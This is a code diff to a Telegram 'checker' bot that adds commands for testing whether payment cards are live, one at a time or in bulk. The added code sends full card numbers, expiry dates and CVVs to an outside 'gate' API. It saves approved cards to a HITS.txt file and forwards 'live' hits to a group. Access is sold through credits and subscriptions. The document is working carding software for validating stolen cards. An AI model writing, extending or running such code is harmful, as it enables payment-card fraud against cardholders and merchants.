@@ -44,6 +44,7 @@ SHOPIFY_API_URL = "https://darkwaslost-cc-api-vnhx.onrender.com/key=cytron/cc={}
 B4_API_URL = "https://api-b4-storm.onrender.com/gate=b4/key=darkwaslost/cc={}"
 PP_API_URL = "https://darkwaslost-pp-api.onrender.com/gate=b3/key=wasdarkboy/cc={}"
 PY_API_URL = "https://pyvbv2-api-storm.onrender.com/gate=paypal/key=waslost/cc={}"
+SVBV_API_URL = "https://pyvbv2-api-storm.onrender.com/gate=vbv2/key=waslost/cc={}"
 BOT_START_TIME = time.time()
 
 def read_firebase(path):
@@ -9936,7 +9937,321 @@ def handle_mpy(message):
     except Exception as e:
         bot.reply_to(message, f"❌ An error occurred: {str(e)}")
 
+def check_svbv_cc(cc):
+    try:
+        card = cc.replace('/', '|')
+        lista = card.split("|")
+        cc = lista[0]
+        mm = lista[1]
+        yy = lista[2]
+        if "20" in yy:
+            yy = yy.split("20")[1]
+        cvv = lista[3]
+        
+        # Get BIN info
+        bin_info = None
+        try:
+            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
+            if bin_response.status_code == 200:
+                bin_info = bin_response.json()
+        except:
+            pass
+            
+        # Set default values if BIN lookup failed
+        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
+        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        
+        # Prepare card for API
+        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
+        
+        try:
+            response = requests.get(SVBV_API_URL.format(formatted_cc), timeout=120)
+            if response.status_code == 200:
+                try:
+                    data = response.json()
+                except json.JSONDecodeError:
+                    return {
+                        'status': 'ERROR',
+                        'card': card,
+                        'message': 'Invalid API response',
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': 'Paypal [0.1$]'
+                    }
+                    
+                status = data.get('status', 'Declined ❌').replace('Declined ❌', 'DECLINED').replace('Declined \u274c', 'DECLINED')
+                message = data.get('response', 'Your card was declined.')
+                
+                if 'Live' in status or 'Approved' in status:
+                    status = 'APPROVED'
+                    with open('HITS.txt','a') as hits:
+                        hits.write(card+'\n')
+                    return {
+                        'status': 'APPROVED',
+                        'card': card,
+                        'message': message,
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': '3DS Site Based'
+                    }
+                else:
+                    return {
+                        'status': 'DECLINED',
+                        'card': card,
+                        'message': message,
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': '3DS Site Based'
+                    }
+            else:
+                return {
+                    'status': 'ERROR',
+                    'card': card,
+                    'message': f'API Error: {response.status_code}',
+                    'brand': brand,
+                    'country': f"{country_name} {country_flag}",
+                    'type': card_type,
+                    'gateway': '3DS Site Based'
+                }
+        except requests.exceptions.Timeout:
+            return {
+                'status': 'ERROR',
+                'card': card,
+                'message': 'API Timeout',
+                'brand': brand,
+                'country': f"{country_name} {country_flag}",
+                'type': card_type,
+                'gateway': '3DS Site Based'
+            }
+        except Exception as e:
+            return {
+                'status': 'ERROR',
+                'card': card,
+                'message': str(e),
+                'brand': brand,
+                'country': f"{country_name} {country_flag}",
+                'type': card_type,
+                'gateway': '3DS Site Based'
+            }
+            
+    except Exception as e:
+        return {
+            'status': 'ERROR',
+            'card': card,
+            'message': 'Invalid Input',
+            'brand': 'UNKNOWN',
+            'country': 'UNKNOWN 🌐',
+            'type': 'UNKNOWN',
+            'gateway': '3DS Site Based'
+        }
 
+# Handle both /cc and .cc
+@bot.message_handler(commands=['svbv'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.svbv'))
+def handle_svbv(message):
+    # Check if user is allowed to use in DMs
+    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
+        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
+        return
+    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
+        bot.reply_to(message, "❌ This group is not approved to use this bot.")
+        return
+
+    if not confirm_time():
+        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
+        return
+
+    # Check flood control for non-subscribed users
+    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
+        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
+        return
+
+    # Check credits for non-subscribed users
+    if not is_user_subscribed(message.from_user.id):
+        if not check_user_credits(message.from_user.id, 1):
+            remaining = get_remaining_credits(message.from_user.id)
+            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
+            return
+        deduct_credits(message.from_user.id, 1)
+
+    try:
+        # Extract card from message or reply
+        if message.text.startswith('/'):
+            parts = message.text.split()
+            if len(parts) < 2:
+                if message.reply_to_message:
+                    cc = message.reply_to_message.text.strip()
+                else:
+                    bot.reply_to(message, "❌ Invalid format. Use /svbv CC|MM|YYYY|CVV or .svbv CC|MM|YYYY|CVV")
+                    return
+            else:
+                cc = parts[1]
+        else:
+            cc = message.text[4:].strip()
+
+        start_time = time.time()
+
+        user_full_name = message.from_user.first_name
+        if message.from_user.last_name:
+            user_full_name += " " + message.from_user.last_name
+
+        status_msg = bot.reply_to(
+            message,
+            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>3DS Site Based</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
+            parse_mode='HTML'
+        )
+
+        def check_card():
+            try:
+                result = check_svbv_cc(cc)
+                result['user_id'] = message.from_user.id  # Added line to include user ID
+                processing_time = time.time() - start_time
+                response_text = format_single_response(result, user_full_name, processing_time)
+
+                # Send result to user
+                bot.edit_message_text(chat_id=message.chat.id,
+                                      message_id=status_msg.message_id,
+                                      text=response_text,
+                                      parse_mode='HTML')
+
+                # Auto forward hits
+                try:
+                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
+                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
+                except Exception as e:
+                    print(f"[Auto Forward Error - /svbv] {e}")
+
+            except Exception as e:
+                bot.edit_message_text(chat_id=message.chat.id,
+                                      message_id=status_msg.message_id,
+                                      text=f"❌ An error occurred: {str(e)}")
+
+        threading.Thread(target=check_card).start()
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}")
+
+# Handle both /mcc and .mcc
+@bot.message_handler(commands=['msvbv'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msvbv'))
+def handle_msvbv(message):
+    # Check if user is allowed to use in DMs
+    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
+        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
+        return
+    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
+        bot.reply_to(message, "❌ This group is not approved to use this bot.")
+        return
+    
+    if not confirm_time():
+        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
+        return
+    
+    # Check if user is subscribed
+    if not is_user_subscribed(message.from_user.id):
+        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
+        return
+    
+    # Check mass check cooldown
+    if not check_mass_check_cooldown(message.from_user.id):
+        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
+        return
+    
+    try:
+        cards_text = None
+        command_parts = message.text.split()
+        
+        # Check if cards are provided after command
+        if len(command_parts) > 1:
+            cards_text = ' '.join(command_parts[1:])
+        elif message.reply_to_message:
+            cards_text = message.reply_to_message.text
+        else:
+            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
+            return
+            
+        cards = []
+        for line in cards_text.split('\n'):
+            line = line.strip()
+            if line:
+                for card in line.split():
+                    if '|' in card:
+                        cards.append(card.strip())
+        
+        if not cards:
+            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
+            return
+        
+        # Determine max limit based on subscription status
+        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
+        
+        if len(cards) > max_limit:
+            cards = cards[:max_limit]
+            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
+        
+        start_time = time.time()
+            
+        user_full_name = message.from_user.first_name
+        if message.from_user.last_name:
+            user_full_name += " " + message.from_user.last_name
+            
+        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
+        
+        def check_cards():
+            try:
+                results = []
+                for i, card in enumerate(cards, 1):
+                    try:
+                        result = check_svbv_cc(card)
+                        results.append(result)
+                        
+                        processing_time = time.time() - start_time
+                        response_text = format_mchk_response(results, len(cards), processing_time, i)
+                        bot.edit_message_text(chat_id=message.chat.id,
+                                            message_id=status_msg.message_id,
+                                            text=response_text,
+                                            parse_mode='HTML')
+                    except Exception as e:
+                        results.append({
+                            'status': 'ERROR',
+                            'card': card,
+                            'message': f'Invalid: {str(e)}',
+                            'brand': 'UNKNOWN',
+                            'country': 'UNKNOWN 🌐',
+                            'type': 'UNKNOWN',
+                            'gateway': '3DS Site Based'
+                        })
+                        processing_time = time.time() - start_time
+                        response_text = format_mchk_response(results, len(cards), processing_time, i)
+                        bot.edit_message_text(chat_id=message.chat.id,
+                                            message_id=status_msg.message_id,
+                                            text=response_text,
+                                            parse_mode='HTML')
+                
+                processing_time = time.time() - start_time
+                response_text = format_mchk_response(results, len(cards), processing_time)
+                bot.edit_message_text(chat_id=message.chat.id,
+                                    message_id=status_msg.message_id,
+                                    text=response_text,
+                                    parse_mode='HTML')
+            
+            except Exception as e:
+                bot.edit_message_text(chat_id=message.chat.id,
+                                     message_id=status_msg.message_id,
+                                     text=f"❌ An error occurred: {str(e)}",
+                                     parse_mode='HTML')
+        
+        threading.Thread(target=check_cards).start()
+    
+    except Exception as e:
+        bot.reply_to(message, f"❌ An error occurred: {str(e)}")
+        
 # Start the bot
 if __name__ == "__main__":
     print("✦ 𝑺𝒕𝒐𝒓𝒎 ✗ 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 𖤐 is running...")
